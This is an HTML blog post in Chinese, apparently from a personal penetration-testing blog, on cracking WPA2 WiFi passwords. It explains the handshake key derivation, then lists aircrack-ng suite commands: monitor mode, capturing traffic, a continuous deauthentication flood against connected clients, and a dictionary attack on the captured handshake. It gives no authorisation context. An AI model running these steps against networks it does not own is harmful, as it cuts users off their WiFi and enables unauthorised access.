@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>破解WiFi密码</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/wifi/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='破解WiFi密码'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/wifi/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/wifi/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+<meta name="twitter:title" content="破解WiFi密码">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/wifi/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/wifi/">
+                <img src="/p/wifi/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/wifi/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/wifi/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post 破解WiFi密码" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="background-color: #2a9d8f; color: #fff;">
+                渗透测试
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/wifi/">破解WiFi密码</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 09, 2020</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="破解wifi密码">破解WiFi密码</h1>
+<h2 id="基础">基础</h2>
+<p>WPA2其实是基于WPA的一种新的加密方式。WPA指的是保护无线电脑网络安全系统（Wi-Fi Protected Access），大大增强现有以及未来无线局域网系统的数据保护和访问控制水平。而WPA2是WPA的增强型版本，与WPA相比，WPA2新增了支持AES的加密方式。WPA2其安全性是利用密钥导出函数来增强的，但是使用者采用的典型的弱密也会被密码破解攻击。</p>
+<p>WPA密码其实称为PSK，长度一般是8-63字节，它加上ssid通过哈希算法可以得到PMK，PMK是定长的64字节。由于计算PMK的过程开销比较大，是破解花费时间长的关键，所以采用以空间换时间的原则把PMK事先生成好，这个事先生成好的表就是常说的HASH表，这个工作就是用airlib-ng这个工具来完成的。</p>
+<p>在认证的时候会生成一个PTK，这是一组密钥，它的生成方法也是采用哈希，参数是连接的客户端MAC地址、AP的BSSID、A-NONCE、S-NONCE、PMK，其中A-NONCE和S-NONCE是两个随机数，确保每次连接都会生成不同的PTK，PTK的计算消耗很小，PTK加上报文数据采用加密算法（AES或TKIP）得到密文，同时会得到一个签名，叫做MIC（message integrality check）。</p>
+<p><strong>破解密码的关键流程：</strong></p>
+<ul>
+<li>PMK = SHA-1(SSID, PSK)</li>
+<li>PTK = hash(MAC, BSSID, A-NONCE, S-NONCE, PMK)</li>
+<li>密文 = AES或TKIP(PTK, data)</li>
+<li>签名MIC = HMAC(PTK, 整个802.1x认证报文)</li>
+</ul>
+<p>在握手包过程中可以获得的是：<strong>客户端的MAC地址，AP的BSSID，A-NONCE，S-NONE，MIC</strong>。而认证原理就是客户端算出MIC发给AP，AP也采用相同方法计算并与之比较，若一致则认证通过。</p>
+<p><strong>破解：</strong></p>
+<ul>
+<li>
+<p>先抓取握手包</p>
+</li>
+<li>
+<p>用字典中的PSK+ssid先生成PMK（如果有已经生成好的HASH表则略过）</p>
+</li>
+<li>
+<p>结合握手包中的（客户端MAC，AP的BSSID，A-NONCE，S-NONCE）计算PTK，再加上原始的报文数据算出MIC并与AP发送的MIC比较，如果一致，那么该PSK就是密钥</p>
+</li>
+</ul>
+<h2 id="原理">原理</h2>
+<p>通过DeAuth泛洪攻击让连接WiFi的设备断开连接，客户端设备会尝试重联，在这个过程中监听某设备与WiFi重新建立连接时的握手包，其中包含密文密码，随后使用工具破解即可。</p>
+<h2 id="利用">利用</h2>
+<h3 id="开启网卡监听">开启网卡监听</h3>
+<pre tabindex="0"><code>airmon-ng start wlan0
+</code></pre><h3 id="扫描wifi信号">扫描WiFi信号</h3>
+<pre tabindex="0"><code>airodump-ng wlan0mon
+</code></pre><p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1896; 
+			flex-basis: 4551px"
+	>
+	<a href="/p/wifi/image-20220214204722612.png" data-size="550x29">
+		<img src="/p/wifi/image-20220214204722612.png"
+			width="550"
+			height="29"
+			srcset="/p/wifi/image-20220214204722612_hueadd420dfec33d7685bd5dabd63c30f3_19906_480x0_resize_box_3.png 480w, /p/wifi/image-20220214204722612_hueadd420dfec33d7685bd5dabd63c30f3_19906_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>各个参数含义：</p>
+<ul>
+<li>BSSID 路由器的 MAC 地址</li>
+<li>PWR 信号的强度，数值越大代表信息越强</li>
+<li>CH 信道</li>
+<li>ENC 加密的方式</li>
+<li>AUTH 认证方式</li>
+<li>ESSID WIFI名字</li>
+</ul>
+<h3 id="监听流量">监听流量</h3>
+<pre tabindex="0"><code>airodump-ng -w wifi名 -c 信道 --bssid xxxx wlan0mon
+</code></pre><h3 id="deauth泛洪攻击">DeAuth泛洪攻击</h3>
+<pre tabindex="0"><code>aireplay-ng -0 0 -a WIFI物理地址 -c 用户设备物理地址 wlan0mon
+# 参数
+-0 3 表示发送3次，-0 0 表示持续发送；不加 -c 参数表示断开所有客户端的连接
+</code></pre><h3 id="暴力破解">暴力破解</h3>
+<p>查看所拦截的数据包，检测这个包里是否有握手包：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">aircrack-ng /tmp/xxx.cap
+</code></pre></div><p>破解：</p>
+<pre tabindex="0"><code>aircrack-ng /tmp/xxx.cap -w 字典路径
+</code></pre>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/redis/">
+        
+        
+            <div class="article-image">
+                <img src="/p/redis/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Redis 未授权利用"
+                        data-key="redis" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Redis 未授权利用</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/sql-phpmyadmin/">
+        
+        
+            <div class="article-image">
+                <img src="/p/sql-phpmyadmin/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post phpMyAdmin 常见利用"
+                        data-key="sql-phpmyadmin" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">phpMyAdmin 常见利用</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/1/">
+        
+        
+            <div class="article-image">
+                <img src="/p/1/_hu0a3f1163de68d0b9471979ebf0ecf11e_32400_a354a9a1f5102742bceb4ec236f4ce2f.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Linux 提权"
+                        data-key="1" 
+                        data-hash="md5-rC&#43;UhC7sa7h6Y66uIugvQQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Linux 提权</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#基础">基础</a></li>
+    <li><a href="#原理">原理</a></li>
+    <li><a href="#利用">利用</a>
+      <ol>
+        <li><a href="#开启网卡监听">开启网卡监听</a></li>
+        <li><a href="#扫描wifi信号">扫描WiFi信号</a></li>
+        <li><a href="#监听流量">监听流量</a></li>
+        <li><a href="#deauth泛洪攻击">DeAuth泛洪攻击</a></li>
+        <li><a href="#暴力破解">暴力破解</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
